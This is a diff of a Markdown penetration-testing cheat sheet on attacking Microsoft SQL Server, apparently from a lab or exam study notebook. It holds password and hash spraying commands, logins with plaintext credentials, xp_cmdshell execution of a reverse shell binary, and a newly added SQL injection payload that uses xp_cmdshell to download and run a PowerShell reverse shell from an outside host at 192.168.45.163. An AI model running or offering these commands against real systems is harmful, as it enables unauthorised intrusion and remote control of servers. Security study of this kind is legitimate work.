@@ -28,14 +28,14 @@ proxychains crackmapexec mssql -d example.com -u sql_service -p password123  -x 
 Do not trust nxc's mssql  thing. try it manually, "impacket-mssqlclient administrator:hghgib6vHT3bVWf@10.10.112.154 -windows-auth"
 
 ````
-nxc mssql $IP -u users.txt -p passwords.txt --continue-on-success
-nxc mssql $IP -u users.txt -H $HASH --continue-on-success
+nxc mssql $ip -u users.txt -p passwords.txt --continue-on-success
+nxc mssql $ip -u users.txt -H $HASH --continue-on-success
 ````
 
 ##### Logging in
 
 ````
-sqsh -S $IP -U sa -P CrimsonQuiltScalp193 #linux
+sqsh -S $ip -U sa -P CrimsonQuiltScalp193 #linux
 proxychains sqsh -S 10.10.126.148 -U example.com\\sql_service -P password123 -D msdb #windows
 ````
 
@@ -55,6 +55,12 @@ go
 xp_cmdshell 'c:\Users\Public\reverse.exe"'
 go
 ````
+
+Revshell Command that worked:
+
+```bash
+admin' UNION SELECT 1,2; EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.163:8000/rev.ps1") | powershell -noprofile';--+
+```
 
 ##### Notes
 
